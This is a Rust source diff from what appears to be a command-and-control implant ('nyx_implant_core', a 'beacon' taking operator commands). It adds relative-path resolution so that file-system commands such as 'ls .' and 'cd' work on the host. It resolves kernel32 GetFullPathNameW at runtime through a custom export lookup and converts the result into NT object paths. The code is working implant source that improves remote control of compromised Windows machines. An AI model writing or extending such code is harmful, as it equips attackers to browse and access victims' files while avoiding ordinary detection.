@@ -346,12 +346,86 @@ pub fn selftest_hive_guard() -> u32 {
     mask
 }
 
+/// True when `p` is a RELATIVE path (".", "..", "dir\file") — no leading
+/// `\`/`/` and no `X:` drive prefix. UNC (`\\host\share`) and NT-prefixed
+/// paths count as absolute here (they skip the `\??\` prepend below).
+fn is_relative_path(p: &str) -> bool {
+    let b = p.as_bytes();
+    if b.starts_with(b"\\") || b.starts_with(b"/") {
+        return false;
+    }
+    !(b.len() >= 2 && b[1] == b':' && b[0].is_ascii_alphabetic())
+}
+
+/// Resolve a relative path against the beacon's current directory via
+/// kernel32 GetFullPathNameW (two-pass: size, then fill). Returns None when
+/// the export or the call fails — the caller falls back to the raw path.
+/// This is what makes `ls .` work: the NT object manager has no `\??\.`
+/// entry (STATUS_OBJECT_NAME_NOT_FOUND), so relative paths MUST be made
+/// absolute before to_nt_path. Also collapses `.`/`..` segments, and it
+/// honors the beacon CWD set by the `cd` shell builtin.
+fn resolve_full_path(rel: &str) -> Option<String> {
+    type GetFullPathNameW = unsafe extern "system" fn(
+        *const u16,    // lpFileName
+        u32,           // nBufferLength
+        *mut u16,      // lpBuffer
+        *mut *mut u16, // lpFilePart (unused)
+    ) -> u32;
+    let fp: GetFullPathNameW = unsafe {
+        core::mem::transmute(nyx_implant_core::resolve::export_addr(
+            b"kernel32.dll",
+            b"GetFullPathNameW",
+        )?)
+    };
+    let mut in_buf: Vec<u16> = rel.encode_utf16().collect();
+    in_buf.push(0);
+    unsafe {
+        let need = fp(
+            in_buf.as_ptr(),
+            0,
+            core::ptr::null_mut(),
+            core::ptr::null_mut(),
+        );
+        if need == 0 {
+            return None;
+        }
+        let mut out: Vec<u16> = vec![0u16; need as usize];
+        let got = fp(
+            in_buf.as_ptr(),
+            need,
+            out.as_mut_ptr(),
+            core::ptr::null_mut(),
+        );
+        if got == 0 || got >= need {
+            return None;
+        }
+        out.truncate(got as usize);
+        Some(String::from_utf16_lossy(&out))
+    }
+}
+
 /// Convert an operator path ("C:\Users\foo\bar.txt") into an NT object path
 /// ("\??\C:\Users\foo\bar.txt") as a UTF-16 buffer. NtCreateFile requires the
 /// `\??\` (or `\Device\...`) prefix — raw drive letters without it are
-/// rejected with STATUS_OBJECT_PATH_SYNTAX_BAD. The buffer is NOT null-
-/// terminated (UNICODE_STRING is length-prefixed).
+/// rejected with STATUS_OBJECT_PATH_SYNTAX_BAD. Relative paths are resolved
+/// against the beacon CWD first (see resolve_full_path). The buffer is NOT
+/// null-terminated (UNICODE_STRING is length-prefixed).
 fn to_nt_path(win_path: &str) -> Option<Vec<u16>> {
+    // Relative paths mean nothing to the NT object manager (\??\. →
+    // STATUS_OBJECT_NAME_NOT_FOUND) — resolve via the Win32 layer first.
+    // On resolution failure we fall through with the raw path (old behavior).
+    let resolved;
+    let win_path = if is_relative_path(win_path) {
+        match resolve_full_path(win_path) {
+            Some(abs) => {
+                resolved = abs;
+                resolved.as_str()
+            }
+            None => win_path,
+        }
+    } else {
+        win_path
+    };
     let bytes = win_path.as_bytes();
     let starts_nt = bytes.starts_with(b"\\") || bytes.starts_with(b"/");
     let mut out: Vec<u16> = Vec::with_capacity(bytes.len() + 4);
